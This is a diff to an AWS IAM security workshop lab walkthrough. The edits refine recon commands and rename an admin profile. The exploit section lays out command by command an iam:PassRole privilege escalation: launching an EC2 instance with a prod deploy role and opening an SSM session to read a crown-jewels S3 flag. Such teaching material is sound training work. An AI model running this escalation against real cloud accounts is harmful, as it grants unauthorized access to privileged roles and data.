@@ -4,9 +4,9 @@ Source: Lab 1 Exercise 5. Identity: `iamws-ci-runner-user`. Target: crown jewels
 
 ## Pre-attack — recon with iam-recon
 
-- `iam-recon --account $ACCOUNT_ID argquery --preset privesc` → shows EC2 PassRole edge to `iamws-prod-deploy-role`.
+- `iam-recon --account $ACCOUNT_ID argquery --preset privesc --principal user/iamws-ci-runner-user` → shows EC2 PassRole edge to `iamws-prod-deploy-role`.
 - `iam-recon --account $ACCOUNT_ID argquery --principal user/iamws-ci-runner-user --action iam:PassRole` → ALLOW line confirms unrestricted PassRole.
-- `iam-recon --account $ACCOUNT_ID pathfinding` → also surfaces `[ec2-001]` (New PassRole).
+- `iam-recon --account $ACCOUNT_ID pathfinding --principal user/iamws-ci-runner-user` → also surfaces `[ec2-001]` (New PassRole).
 - Examine the policy: notice `iam:PassRole` has `Resource: *` and **no** `iam:PassedToService` condition.
 
 ## Exploit — full command path
@@ -23,11 +23,11 @@ aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
 # Step 2: inspect the vulnerable policy
 # NOTE: iamws-ci-runner-user does NOT have iam:GetPolicyVersion — this command fails as the
 #       attacker user (AccessDeniedException). The policy contents are shown in the slide; if a
-#       participant wants to verify, they can run this against the admin profile (e.g. taractf).
+#       participant wants to verify, they can run this against the admin profile (e.g. iamws-lab-default).
 aws iam get-policy-version \
   --policy-arn arn:aws:iam::${ACCOUNT_ID}:policy/iamws-ci-runner-policy \
   --version-id v1 --query 'PolicyVersion.Document' --output json \
-  --profile taractf
+  --profile iamws-lab-default
 # note: PassRole has Resource:* and NO Condition block
 
 # Step 3: find an AMI + subnet
@@ -53,18 +53,18 @@ echo "Launched: $INSTANCE_ID"
 
 # Step 5: wait ~90s for the SSM agent to register
 # NOTE: iamws-ci-runner-user lacks ssm:DescribeInstanceInformation, so polling for "Online"
-#       as the attacker fails. Either sleep 90s blindly, or poll under taractf.
+#       as the attacker fails. Either sleep 90s blindly, or poll under iamws-lab-default.
 sleep 90
 aws ssm describe-instance-information \
   --filters "Key=InstanceIds,Values=$INSTANCE_ID" \
   --query 'InstanceInformationList[0].PingStatus' --output text \
-  --profile taractf
+  --profile iamws-lab-default
 # expect: Online
 
 # Step 6: SSM session into the instance, claim crown jewels
 # This step is INTERACTIVE — `aws ssm start-session` opens a tty. Run it from a real terminal,
 # not from a non-interactive shell / CI runner. Validation harnesses should use
-# `aws ssm send-command` as taractf instead (see cleanup.md).
+# `aws ssm send-command` as iamws-lab-default instead (see cleanup.md).
 aws ssm start-session --target $INSTANCE_ID \
   --profile iamws-ci-runner-user
 
